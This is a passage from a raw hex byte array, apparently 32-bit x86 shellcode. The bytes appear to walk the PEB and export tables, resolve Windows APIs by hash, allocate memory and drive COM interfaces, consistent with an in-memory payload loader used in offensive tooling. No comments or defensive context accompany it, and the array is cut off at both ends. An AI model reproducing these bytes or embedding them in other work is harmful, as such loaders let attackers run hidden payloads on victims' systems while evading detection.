0x96, 0x88, 0x00, 0x00, 0x00, 0x57, 0xff, 0x96, 0xd0, 0x00, 0x00, 0x00, \n  0xff, 0x74, 0x24, 0x30, 0xff, 0x96, 0xd0, 0x00, 0x00, 0x00, 0xff, 0x74, \n  0x24, 0x34, 0xff, 0x96, 0xd0, 0x00, 0x00, 0x00, 0x85, 0xed, 0x74, 0x4e, \n  0x83, 0xbe, 0x34, 0x02, 0x00, 0x00, 0x03, 0x75, 0x45, 0xff, 0xb6, 0x58, \n  0x0d, 0x00, 0x00, 0x8b, 0xbe, 0x60, 0x0d, 0x00, 0x00, 0x8d, 0x86, 0x48, \n  0x0d, 0x00, 0x00, 0x57, 0x50, 0x8d, 0x86, 0x38, 0x0d, 0x00, 0x00, 0x50, \n  0xe8, 0x9e, 0x20, 0x00, 0x00, 0xff, 0x76, 0x2c, 0x8d, 0x86, 0x2c, 0x0c, \n  0x00, 0x00, 0xff, 0x76, 0x28, 0x50, 0xe8, 0x62, 0x1f, 0x00, 0x00, 0x83, \n  0xc4, 0x1c, 0x3b, 0x87, 0x18, 0x05, 0x00, 0x00, 0x75, 0x0c, 0x3b, 0x97, \n  0x1c, 0x05, 0x00, 0x00, 0x75, 0x04, 0x8b, 0xc5, 0xeb, 0x02, 0x33, 0xc0, \n  0x5f, 0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0xec, 0x02, 0x00, 0x00, 0xc3, 0x81, \n  0xec, 0xdc, 0x01, 0x00, 0x00, 0x53, 0x55, 0x56, 0x8b, 0xb4, 0x24, 0xf0, \n  0x01, 0x00, 0x00, 0x57, 0x8b, 0x6e, 0x3c, 0x8b, 0x44, 0x2e, 0x78, 0x85, \n  0xc0, 0x0f, 0x84, 0xe5, 0x00, 0x00, 0x00, 0x8d, 0x3c, 0x30, 0x8b, 0x5f, \n  0x18, 0x85, 0xdb, 0x0f, 0x84, 0xd7, 0x00, 0x00, 0x00, 0x8b, 0x47, 0x1c, \n  0x33, 0xd2, 0x03, 0xc6, 0x89, 0x54, 0x24, 0x10, 0x89, 0x44, 0x24, 0x24, \n  0x8b, 0x47, 0x20, 0x03, 0xc6, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x47, 0x24, \n  0x03, 0xc6, 0x89, 0x44, 0x24, 0x20, 0x8b, 0x47, 0x0c, 0x03, 0xc6, 0x8a, \n  0x08, 0x84, 0xc9, 0x74, 0x2a, 0x8b, 0x74, 0x24, 0x10, 0x8d, 0x94, 0x24, \n  0xe8, 0x00, 0x00, 0x00, 0x2b, 0xd0, 0x80, 0xc9, 0x20, 0x46, 0x88, 0x0c, \n  0x02, 0x40, 0x8a, 0x08, 0x84, 0xc9, 0x75, 0xf2, 0x89, 0x74, 0x24, 0x10, \n  0x8b, 0xb4, 0x24, 0xf4, 0x01, 0x00, 0x00, 0x8b, 0x54, 0x24, 0x10, 0xff, \n  0xb4, 0x24, 0x04, 0x02, 0x00, 0x00, 0x8d, 0x84, 0x24, 0xec, 0x00, 0x00, \n  0x00, 0xc6, 0x84, 0x14, 0xec, 0x00, 0x00, 0x00, 0x00, 0xff, 0xb4, 0x24, \n  0x04, 0x02, 0x00, 0x00, 0x50, 0xe8, 0x97, 0x1e, 0x00, 0x00, 0x89, 0x44, \n  0x24, 0x24, 0x83, 0xc4, 0x0c, 0x8b, 0x44, 0x24, 0x14, 0x83, 0xc0, 0xfc, \n  0x89, 0x54, 0x24, 0x1c, 0x8d, 0x04, 0x98, 0x89, 0x44, 0x24, 0x10, 0xff, \n  0xb4, 0x24, 0x04, 0x02, 0x00, 0x00, 0x8b, 0x08, 0xff, 0xb4, 0x24, 0x04, \n  0x02, 0x00, 0x00, 0x03, 0xce, 0x51, 0xe8, 0x66, 0x1e, 0x00, 0x00, 0x33, \n  0x44, 0x24, 0x24, 0x83, 0xc4, 0x0c, 0x33, 0x54, 0x24, 0x1c, 0x3b, 0x84, \n  0x24, 0xf8, 0x01, 0x00, 0x00, 0x75, 0x09, 0x3b, 0x94, 0x24, 0xfc, 0x01, \n  0x00, 0x00, 0x74, 0x1d, 0x8b, 0x44, 0x24, 0x10, 0x83, 0xe8, 0x04, 0x89, \n  0x44, 0x24, 0x10, 0x83, 0xeb, 0x01, 0x75, 0xbb, 0x33, 0xc0, 0x5f, 0x5e, \n  0x5d, 0x5b, 0x81, 0xc4, 0xdc, 0x01, 0x00, 0x00, 0xc3, 0x8b, 0x44, 0x24, \n  0x20, 0x8b, 0x4c, 0x24, 0x24, 0x0f, 0xb7, 0x44, 0x58, 0xfe, 0x8b, 0x14, \n  0x81, 0x03, 0xd6, 0x3b, 0xd7, 0x72, 0x76, 0x8b, 0x44, 0x2e, 0x7c, 0x03, \n  0xc7, 0x3b, 0xd0, 0x73, 0x6c, 0x33, 0xc9, 0x38, 0x0a, 0x74, 0x1d, 0x8d, \n  0x5c, 0x24, 0x28, 0x8b, 0xfa, 0x2b, 0xda, 0x83, 0xf9, 0x3c, 0x73, 0x10, \n  0x8a, 0x07, 0x88, 0x04, 0x3b, 0x3c, 0x2e, 0x74, 0x07, 0x41, 0x47, 0x80, \n  0x3f, 0x00, 0x75, 0xeb, 0x42, 0xc7, 0x44, 0x0c, 0x29, 0x64, 0x6c, 0x6c, \n  0x00, 0x03, 0xca, 0x33, 0xd2, 0x38, 0x11, 0x74, 0x17, 0x8d, 0x7c, 0x24, \n  0x68, 0x2b, 0xf9, 0x83, 0xfa, 0x7f, 0x73, 0x0c, 0x8a, 0x01, 0x42, 0x88, \n  0x04, 0x0f, 0x41, 0x80, 0x39, 0x00, 0x75, 0xef, 0x8d, 0x44, 0x24, 0x68, \n  0xc6, 0x44, 0x14, 0x68, 0x00, 0x50, 0x8d, 0x44, 0x24, 0x2c, 0x50, 0x56, \n  0xff, 0xb4, 0x24, 0xfc, 0x01, 0x00, 0x00, 0xe8, 0x0c, 0x00, 0x00, 0x00, \n  0x83, 0xc4, 0x10, 0x8b, 0xd0, 0x8b, 0xc2, 0xe9, 0x62, 0xff, 0xff, 0xff, \n  0x55, 0x8b, 0xec, 0x64, 0xa1, 0x18, 0x00, 0x00, 0x00, 0x33, 0xc9, 0x53, \n  0x56, 0x57, 0x8b, 0x40, 0x30, 0x8b, 0x7d, 0x08, 0x8b, 0x40, 0x0c, 0x8b, \n  0x70, 0x0c, 0x39, 0x4e, 0x18, 0x74, 0x2a, 0x8b, 0x5d, 0x0c, 0x85, 0xc9, \n  0x75, 0x3f, 0x39, 0x5e, 0x18, 0x74, 0x12, 0x51, 0xff, 0x75, 0x14, 0xff, \n  0x76, 0x18, 0x57, 0xe8, 0xc3, 0x1b, 0x00, 0x00, 0x83, 0xc4, 0x10, 0x8b, \n  0xc8, 0x8b, 0x36, 0x83, 0x7e, 0x18, 0x00, 0x75, 0xdd, 0x85, 0xc9, 0x75, \n  0x1c, 0xff, 0x75, 0x10, 0x57, 0xe8, 0x0b, 0x1b, 0x00, 0x00, 0x59, 0x59, \n  0x85, 0xc0, 0x74, 0x0b, 0xff, 0x75, 0x14, 0x50, 0xff, 0x57, 0x34, 0x8b, \n  0xc8, 0xeb, 0x02, 0x33, 0xc9, 0x5f, 0x5e, 0x8b, 0xc1, 0x5b, 0x5d, 0xc3, \n  0x56, 0x8b, 0x74, 0x24, 0x0c, 0x57, 0x33, 0xff, 0x8b, 0x4e, 0x18, 0x85, \n  0xc9, 0x74, 0x09, 0x8b, 0x01, 0x51, 0xff, 0x50, 0x08, 0x89, 0x7e, 0x18, \n  0x8b, 0x4e, 0x1c, 0x85, 0xc9, 0x74, 0x09, 0x8b, 0x01, 0x51, 0xff, 0x50, \n  0x08, 0x89, 0x7e, 0x1c, 0x8b, 0x4e, 0x14, 0x85, 0xc9, 0x74, 0x09, 0x8b, \n  0x01, 0x51, 0xff, 0x50, 0x08, 0x89, 0x7e, 0x14, 0x8b, 0x4e, 0x08, 0x85, \n  0xc9, 0x74, 0x1e, 0xff, 0x76, 0x10, 0x8b, 0x01, 0x51, 0xff, 0x50, 0x50, \n  0x8b, 0x46, 0x08, 0x50, 0x8b, 0x08, 0xff, 0x51, 0x2c, 0x8b, 0x46, 0x08, \n  0x50, 0x8b, 0x08, 0xff, 0x51, 0x08, 0x89, 0x7e, 0x08, 0x8b, 0x4e, 0x10, \n  0x85, 0xc9, 0x74, 0x09, 0x8b, 0x01, 0x51, 0xff, 0x50, 0x08, 0x89, 0x7e, \n  0x10, 0x8b, 0x4e, 0x0c, 0x85, 0xc9, 0x74, 0x09, 0x8b, 0x01, 0x51, 0xff, \n  0x50, 0x08, 0x89, 0x7e, 0x0c, 0x8b, 0x4e, 0x04, 0x85, 0xc9, 0x74, 0x09, \n  0x8b, 0x01, 0x51, 0xff, 0x50, 0x08, 0x89, 0x7e, 0x04, 0x8b, 0x0e, 0x85, \n  0xc9, 0x74, 0x08, 0x8b, 0x01, 0x51, 0xff, 0x50, 0x08, 0x89, 0x3e, 0x5f, \n  0x5e, 0xc3, 0x8b, 0x44, 0x24, 0x04, 0x83, 0xc0, 0x10, 0xf0, 0xff, 0x00, \n  0x8b, 0x00, 0xc2, 0x04, 0x00, 0xb8, 0x01, 0x40, 0x00, 0x80, 0xc2, 0x0c, \n  0x00, 0xb8, 0x01, 0x40, 0x00, 0x80, 0xc2, 0x10, 0x00, 0x8b, 0x44, 0x24, \n  0x04, 0xff, 0x74, 0x24, 0x18, 0xff, 0x74, 0x24, 0x14, 0x8b, 0x40, 0x08, \n  0xff, 0x74, 0x24, 0x14, 0x50, 0x8b, 0x08, 0xff, 0x51, 0x28, 0xc2, 0x18, \n  0x00, 0xb8, 0x01, 0x40, 0x00, 0x80, 0xc2, 0x14, 0x00, 0x57, 0x8b, 0x7c, \n  0x24, 0x14, 0x85, 0xff, 0x75, 0x07, 0xb8, 0x03, 0x40, 0x00, 0x80, 0xeb, \n  0x16, 0x56, 0x8b, 0x74, 0x24, 0x0c, 0x8b, 0x46, 0x08, 0x50, 0x8b, 0x08, \n  0xff, 0x51, 0x04, 0x8b, 0x46, 0x08, 0x89, 0x07, 0x33, 0xc0, 0x5e, 0x5f, \n  0xc2, 0x10, 0x00, 0x8b, 0x44, 0x24, 0x08, 0x85, 0xc0, 0x75, 0x07, 0xb8, \n  0x03, 0x40, 0x00, 0x80, 0xeb, 0x08, 0xc7, 0x00, 0x01, 0x00, 0x00, 0x00, \n  0x33, 0xc0, 0xc2, 0x08, 0x00, 0x55, 0x8b, 0xec, 0xff, 0x75, 0x28, 0x8b, \n  0x45, 0x08, 0xff, 0x75, 0x24, 0xff, 0x75, 0x20, 0x8b, 0x48, 0x08, 0xff, \n  0x75, 0x1c, 0xff, 0x75, 0x18, 0x8b, 0x11, 0xff, 0x75, 0x0c, 0x50, 0x51, \n  0xff, 0x52, 0x2c, 0x5d, 0xc2, 0x24, 0x00, 0x55, 0x8b, 0xec, 0x81, 0xec, \n  0x04, 0x02, 0x00, 0x00, 0x53, 0x56, 0x57, 0xe8, 0x8b, 0x19, 0x00, 0x00, \n  0x8b, 0x75, 0x0c, 0xb9, 0x7a, 0x1f, 0x40, 0x00, 0xbf, 0x7b, 0x36, 0x40, \n  0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x01, 0xe8, 0x71, 0x19, \n  0x00, 0x00, 0xb9, 0x32, 0x1c, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, \n  0x0e, 0x89, 0x41, 0x04, 0xe8, 0x5e, 0x19, 0x00, 0x00, 0xb9, 0x03, 0x20, \n  0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x08, 0xe8, \n  0x4b, 0x19, 0x00, 0x00, 0xb9, 0x9f, 0x1c, 0x40, 0x00, 0x2b, 0xcf, 0x03, \n  0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x0c, 0xe8, 0x38, 0x19, 0x00, 0x00, 0xb9, \n  0x75, 0x1c, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, \n  0x10, 0xe8, 0x25, 0x19, 0x00, 0x00, 0xb9, 0x51, 0x1c, 0x40, 0x00, 0x2b, \n  0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x14, 0xe8, 0x12, 0x19, 0x00, \n  0x00, 0xb9, 0xb9, 0x1c, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, \n  0x89, 0x41, 0x18, 0xe8, 0xff, 0x18, 0x00, 0x00, 0xb9, 0x1c, 0x12, 0x40, \n  0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x1c, 0xe8, 0xec, \n  0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, \n  0x8b, 0x0e, 0x89, 0x41, 0x20, 0xe8, 0xd9, 0x18, 0x00, 0x00, 0xb9, 0x2e, \n  0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x24, \n  0xe8, 0xc6, 0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, \n  0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x28, 0xe8, 0xb3, 0x18, 0x00, 0x00, \n  0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, \n  0x41, 0x2c, 0xe8, 0xa0, 0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, \n  0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x30, 0xe8, 0x8d, 0x18, \n  0x00, 0x00, 0xb9, 0xeb, 0x1f, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, \n  0x0e, 0x89, 0x41, 0x34, 0xe8, 0x7a, 0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, \n  0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x38, 0xe8, \n  0x67, 0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, \n  0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x3c, 0xe8, 0x54, 0x18, 0x00, 0x00, 0xb9, \n  0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, \n  0x40, 0xe8, 0x41, 0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, \n  0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x44, 0xe8, 0x2e, 0x18, 0x00, \n  0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, \n  0x89, 0x41, 0x48, 0xe8, 0x1b, 0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, \n  0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x4c, 0xe8, 0x08, \n  0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, \n  0x8b, 0x0e, 0x89, 0x41, 0x50, 0xe8, 0xf5, 0x17, 0x00, 0x00, 0xb9, 0x49, \n  0x1c, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x54, \n  0xe8, 0xe2, 0x17, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, \n  0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x58, 0xe8, 0xcf, 0x17, 0x00, 0x00, \n  0xb9, 0x6d, 0x1c, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, \n  0x41, 0x5c, 0xe8, 0xbc, 0x17, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, \n  0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x60, 0xe8, 0xa9, 0x17, \n  0x00, 0x00, 0xb9, 0x13, 0x20, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, \n  0x0e, 0x89, 0x41, 0x64, 0xe8, 0x96, 0x17, 0x00, 0x00, 0xb9, 0x41, 0x1c, \n  0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x68, 0xe8, \n  0x83, 0x17, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, \n  0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x6c, 0xe8, 0x70, 0x17, 0x00, 0x00, 0xb9, \n  0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, \n  0x70, 0xe8, 0x5d, 0x17, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, \n  0xcf, 0x8b, 0x7d, 0x08, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x74, 0x8d, \n  0x85, 0xfc, 0xfd, 0xff, 0xff, 0x83, 0x66, 0x10, 0x00, 0x50, 0x8d, 0x87, \n  0x19, 0x06, 0x00, 0x00, 0x89, 0x7e, 0x14, 0x50, 0x57, 0xe8, 0x16, 0x17, \n  0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x5e, 0x04, 0x8d, 0x85, 0xfc, 0xfd, \n  0xff, 0xff, 0x53, 0x50, 0xff, 0x97, 0xb8, 0x00, 0x00, 0x00, 0x85, 0xc0, \n  0x75, 0x13, 0x8b, 0x0b, 0x8d, 0x46, 0x08, 0x50, 0x8d, 0x87, 0xc0, 0x08, \n  0x00, 0x00, 0x50, 0x8b, 0x11, 0x51, 0xff, 0x52, 0x18, 0x5f, 0x5e, 0x5b, \n  0xc9, 0xc3, 0x8b, 0x54, 0x24, 0x0c, 0x85, 0xd2, 0x75, 0x07, 0xb8, 0x03, \n  0x40, 0x00, 0x80, 0xeb, 0x5f, 0x53, 0x8b, 0x5c, 0x24, 0x0c, 0x33, 0xc9, \n  0x56, 0x8b, 0x74, 0x24, 0x0c, 0x57, 0x8b, 0x7e, 0x14, 0x8b, 0x84, 0x8f, \n  0x30, 0x08, 0x00, 0x00, 0x3b, 0x04, 0x8b, 0x75, 0x08, 0x41, 0x83, 0xf9, \n  0x04, 0x75, 0xee, 0xeb, 0x2a, 0x33, 0xc9, 0x8b, 0x84, 0x8f, 0x40, 0x08, \n  0x00, 0x00, 0x3b, 0x04, 0x8b, 0x75, 0x08, 0x41, 0x83, 0xf9, 0x04, 0x75, \n  0xee, 0xeb, 0x14, 0x33, 0xc9, 0x8b, 0x84, 0x8f, 0xc0, 0x08, 0x00, 0x00, \n  0x3b, 0x04, 0x8b, 0x75, 0x0c, 0x41, 0x83, 0xf9, 0x04, 0x75, 0xee, 0x89, \n  0x32, 0x33, 0xc0, 0xeb, 0x08, 0x83, 0x22, 0x00, 0xb8, 0x02, 0x40, 0x00, \n  0x80, 0x5f, 0x5e, 0x5b, 0xc2, 0x0c, 0x00, 0x8b, 0x44, 0x24, 0x04, 0x6a, \n  0x00, 0x6a, 0x00, 0x6a, 0xfd, 0x8b, 0x40, 0x0c, 0x50, 0x8b, 0x08, 0xff, \n  0x51, 0x38, 0x33, 0xc0, 0xc2, 0x08, 0x00, 0x8b, 0x4c, 0x24, 0x04, 0x83, \n  0xc8, 0xff, 0xf0, 0x0f, 0xc1, 0x41, 0x10, 0x48, 0xc2, 0x04, 0x00, 0x8b, \n  0x44, 0x24, 0x04, 0xff, 0x74, 0x24, 0x08, 0x8b, 0x40, 0x14, 0xff, 0x50, \n  0x4c, 0x33, 0xc0, 0xc2, 0x08, 0x00, 0x55, 0x8b, 0xec, 0x81, 0xec, 0x80, \n  0x00, 0x00, 0x00, 0x56, 0x8b, 0x75, 0x08, 0x57, 0x81, 0xc6, 0x70, 0x04, \n  0x00, 0x00, 0x8a, 0x0e, 0x33, 0xc0, 0x84, 0xc9, 0x74, 0x3f, 0x8d, 0x7d, \n  0x80, 0x8b, 0xd6, 0x2b, 0xfe, 0x80, 0xf9, 0x3b, 0x74, 0x12, 0x3d, 0x80, \n  0x00, 0x00, 0x00, 0x7d, 0x0b, 0x88, 0x0c, 0x17, 0x40, 0x42, 0x8a, 0x0a, \n  0x84, 0xc9, 0x75, 0xe9, 0x85, 0xc0, 0x74, 0x1d, 0xff, 0x75, 0x0c, 0x46, \n  0xc6, 0x44, 0x05, 0x80, 0x00, 0x03, 0xf0, 0x8d, 0x45, 0x80, 0x50, 0xe8, \n  0xb4, 0x1c, 0x00, 0x00, 0x59, 0x59, 0x85, 0xc0, 0x75, 0xbc, 0x40, 0xeb, \n  0x02, 0x33, 0xc0, 0x5f, 0x5e, 0xc9, 0xc3, 0x55, 0x8b, 0xec, 0x83, 0xec, \n  0x1c, 0x83, 0x7d, 0x0c, 0x00, 0x74, 0x31, 0x6a, 0x1c, 0x8d, 0x45, 0xe4, \n  0x50, 0x8b, 0x45, 0x08, 0xff, 0x75, 0x0c, 0xff, 0x50, 0x44, 0x83, 0xf8, \n  0x1c, 0x75, 0x1d, 0x81, 0x7d, 0xf4, 0x00, 0x10, 0x00, 0x00, 0x75, 0x14, \n  0x81, 0x7d, 0xfc, 0x00, 0x00, 0x02, 0x00, 0x75, 0x0b, 0x83, 0x7d, 0xf8, \n  0x04, 0x75, 0x05, 0x33, 0xc0, 0x40, 0xc9, 0xc3, 0x33, 0xc0, 0xc9, 0xc3, \n  0x81, 0xec, 0x14, 0x02, 0x00, 0x00, 0x53, 0x8b, 0x9c, 0x24, 0x24, 0x02, \n  0x00, 0x00, 0x33, 0xc0, 0x21, 0x44, 0x24, 0x04, 0x55, 0x8b, 0xac, 0x24, \n  0x24, 0x02, 0x00, 0x00, 0x56, 0x57, 0x8b, 0xbc, 0x24, 0x28, 0x02, 0x00, \n  0x00, 0x8b, 0x8f, 0xe8, 0x00, 0x00, 0x00, 0x85, 0xc9, 0x0f, 0x84, 0x82, \n  0x00, 0x00, 0x00, 0x53, 0x8d, 0x87, 0x60, 0x08, 0x00, 0x00, 0x50, 0x8d, \n  0x87, 0x50, 0x08, 0x00, 0x00, 0x50, 0xff, 0xd1, 0x85, 0xc0, 0x0f, 0x88, \n  0x9d, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, 0x24, 0x50, 0x8d, 0x45, 0x0c, \n  0x50, 0x57, 0xe8, 0x3d, 0x15, 0x00, 0x00, 0x8b, 0x13, 0x8d, 0x73, 0x04, \n  0x83, 0xc4, 0x0c, 0x8d, 0x87, 0x70, 0x08, 0x00, 0x00, 0x8b, 0x0a, 0x56, \n  0x50, 0x8d, 0x44, 0x24, 0x2c, 0x50, 0x52, 0xff, 0x51, 0x0c, 0x85, 0xc0, \n  0x78, 0x34, 0x8b, 0x06, 0x8d, 0x54, 0x24, 0x14, 0x52, 0x50, 0x8b, 0x08, \n  0xff, 0x51, 0x28, 0x85, 0xc0, 0x78, 0x33, 0x83, 0x7c, 0x24, 0x14, 0x00, \n  0x74, 0x1f, 0x8b, 0x0e, 0x8d, 0x43, 0x08, 0x50, 0x8d, 0x87, 0x90, 0x08, \n  0x00, 0x00, 0x50, 0x8b, 0x11, 0x8d, 0x87, 0x80, 0x08, 0x00, 0x00, 0x50, \n  0x51, 0xff, 0x52, 0x24, 0xeb, 0x03, 0x83, 0x26, 0x00, 0x85, 0xc0, 0x78, \n  0x09, 0x83, 0xbf, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x75, 0x1c, 0x8d, 0x43, \n  0x08, 0x50, 0x8d, 0x87, 0x90, 0x08, 0x00, 0x00, 0x50, 0x8d, 0x87, 0x80, \n  0x08, 0x00, 0x00, 0x50, 0x6a, 0x00, 0x6a, 0x00, 0xff, 0x97, 0xe4, 0x00, \n  0x00, 0x00, 0x85, 0xc0, 0x79, 0x10, 0x83, 0x63, 0x08, 0x00, 0x33, 0xc0, \n  0xe9, 0x1b, 0x01, 0x00, 0x00, 0x83, 0x23, 0x00, 0xeb, 0xd0, 0x8b, 0x43, \n  0x08, 0x50, 0x8b, 0x08, 0xff, 0x51, 0x28, 0x85, 0xc0, 0x0f, 0x88, 0x01, \n  0x01, 0x00, 0x00, 0x8d, 0x85, 0x0c, 0x01, 0x00, 0x00, 0x80, 0x38, 0x00, \n  0x8d, 0x73, 0x0c, 0x75, 0x0c, 0x8b, 0x43, 0x08, 0x56, 0x50, 0x8b, 0x08, \n  0xff, 0x51, 0x34, 0xeb, 0x3e, 0x8d, 0x4c, 0x24, 0x24, 0x51, 0x50, 0x57, \n  0xe8, 0x73, 0x14, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x44, 0x24, 0x24, \n  0x50, 0xff, 0x97, 0xb0, 0x00, 0x00, 0x00, 0x8b, 0x4b, 0x08, 0x8b, 0xf0, \n  0x8d, 0x43, 0x0c, 0x50, 0x6a, 0x00, 0x8b, 0x11, 0x56, 0x51, 0xff, 0x52, \n  0x30, 0x56, 0x89, 0x44, 0x24, 0x1c, 0xff, 0x97, 0xb4, 0x00, 0x00, 0x00, \n  0x8b, 0x44, 0x24, 0x18, 0x8d, 0x73, 0x0c, 0x85, 0xc0, 0x0f, 0x88, 0xa1, \n  0x00, 0x00, 0x00, 0x8b, 0x16, 0x8d, 0x43, 0x10, 0x50, 0x8d, 0x87, 0xa0, \n  0x08, 0x00, 0x00, 0x50, 0x8b, 0x0a, 0x52, 0xff, 0x11, 0x85, 0xc0, 0x0f, \n  0x88, 0x87, 0x00, 0x00, 0x00, 0x8b, 0x85, 0x24, 0x05, 0x00, 0x00, 0x83, \n  0x64, 0x24, 0x20, 0x00, 0x89, 0x44, 0x24, 0x1c, 0x8d, 0x44, 0x24, 0x1c, \n  0x50, 0x6a, 0x01, 0x6a, 0x11, 0xff, 0x97, 0x98, 0x00, 0x00, 0x00, 0x8b, \n  0xf0, 0x85, 0xf6, 0x74, 0x63, 0x8b, 0x56, 0x0c, 0x33, 0xc9, 0x39, 0x8d, \n  0x24, 0x05, 0x00, 0x00, 0x76, 0x13, 0x8a, 0x84, 0x29, 0x28, 0x05, 0x00, \n  0x00, 0x88, 0x04, 0x0a, 0x41, 0x3b, 0x8d, 0x24, 0x05, 0x00, 0x00, 0x72, \n  0xed, 0x8b, 0x4b, 0x10, 0x8d, 0x43, 0x14, 0x50, 0x56, 0x51, 0x8b, 0x11, \n  0xff, 0x92, 0xb4, 0x00, 0x00, 0x00, 0xf7, 0xd8, 0x1b, 0xc0, 0x33, 0xd2, \n  0x40, 0x8b, 0xca, 0x89, 0x44, 0x24, 0x10, 0x8b, 0x46, 0x0c, 0x39, 0x95, \n  0x24, 0x05, 0x00, 0x00, 0x76, 0x13, 0x88, 0x94, 0x29, 0x28, 0x05, 0x00, \n  0x00, 0x88, 0x14, 0x08, 0x41, 0x3b, 0x8d, 0x24, 0x05, 0x00, 0x00, 0x72, \n  0xed, 0x56, 0xff, 0x97, 0xa4, 0x00, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x10, \n  0x5f, 0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0x14, 0x02, 0x00, 0x00, 0xc3, 0x81, \n  0xec, 0x38, 0x01, 0x00, 0x00, 0x53, 0x55, 0x56, 0x8b, 0xb4, 0x24, 0x48, \n  0x01, 0x00, 0x00, 0x57, 0xff, 0x76, 0x2c, 0xff, 0x76, 0x28, 0xff, 0x76, \n  0x4c, 0xff, 0x76, 0x48, 0x56, 0xe8, 0x84, 0x15, 0x00, 0x00, 0xff, 0x76, \n  0x2c, 0x8b, 0xf8, 0xff, 0x76, 0x28, 0x89, 0x7c, 0x24, 0x38, 0xff, 0x76, \n  0x54, 0xff, 0x76, 0x50, 0x56, 0xe8, 0x6c, 0x15, 0x00, 0x00, 0xff, 0x76, \n  0x2c, 0x8b, 0xd8, 0xff, 0x76, 0x28, 0x89, 0x5c, 0x24, 0x44, 0xff, 0xb6, \n  0xec, 0x01, 0x00, 0x00, 0xff, 0xb6, 0xe8, 0x01, 0x00, 0x00, 0x56, 0xe8, \n  0x4e, 0x15, 0x00, 0x00, 0x83, 0xc4, 0x3c, 0x8b, 0xe8, 0x89, 0x6c, 0x24, \n  0x10, 0x85, 0xff, 0x74, 0x28, 0x85, 0xdb, 0x74, 0x24, 0x85, 0xed, 0x74, \n  0x20, 0x6a, 0x04, 0x68, 0x00, 0x30, 0x00, 0x00, 0xff, 0x36, 0x33, 0xdb, \n  0x53, 0xff, 0xd7, 0x8b, 0xf8, 0x85, 0xff, 0x75, 0x1a, 0x83, 0xbe, 0x30, \n  0x02, 0x00, 0x00, 0x02, 0x75, 0x03, 0x53, 0xff, 0xd5, 0x83, 0xc8, 0xff, \n  0x5f, 0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0x38, 0x01, 0x00, 0x00, 0xc3, 0xff, \n  0x36, 0x56, 0x57, 0xe8, 0x77, 0x19, 0x00, 0x00, 0x6a, 0x20, 0x8d, 0x44, \n  0x24, 0x34, 0x53, 0x50, 0xe8, 0x8e, 0x19, 0x00, 0x00, 0x83, 0xc4, 0x18, \n  0x8d, 0x5f, 0x28, 0x83, 0xbf, 0x34, 0x02, 0x00, 0x00, 0x03, 0x75, 0x48, \n  0x8b, 0x07, 0x2d, 0x3c, 0x02, 